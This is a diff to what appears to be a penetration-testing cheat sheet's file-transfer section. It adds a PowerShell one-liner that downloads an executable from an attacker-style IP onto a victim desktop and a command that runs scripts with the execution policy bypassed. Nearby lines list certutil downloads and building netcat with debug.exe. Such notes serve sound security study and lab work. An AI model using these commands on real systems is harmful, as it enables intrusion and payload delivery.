@@ -559,6 +559,9 @@ While not priv esc, we can get current user credentials hash snarf via samba/htt
 * `python -m SimpleHTTPServer 80`
 * Linux: many options, wget, curl, ftp, check what is installed
 * Windows: TFTP (up to Windows XP by default), VBScript or Powershell, also check for FTP/Webdav/etc
+* Windows: `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"`
+* Windows: 
+* Execution Powerhshell Scripts from CMD shell: `powershell -executionpolicy bypass -noninteractive -file script.ps1`. Often need to invoke script at end.
 * Windows: Can use debug.exe to compile a program like nc as a last resort
 * Windows: `certutil.exe -urlcache -split -f https://myserver/filename outputfilename`
 
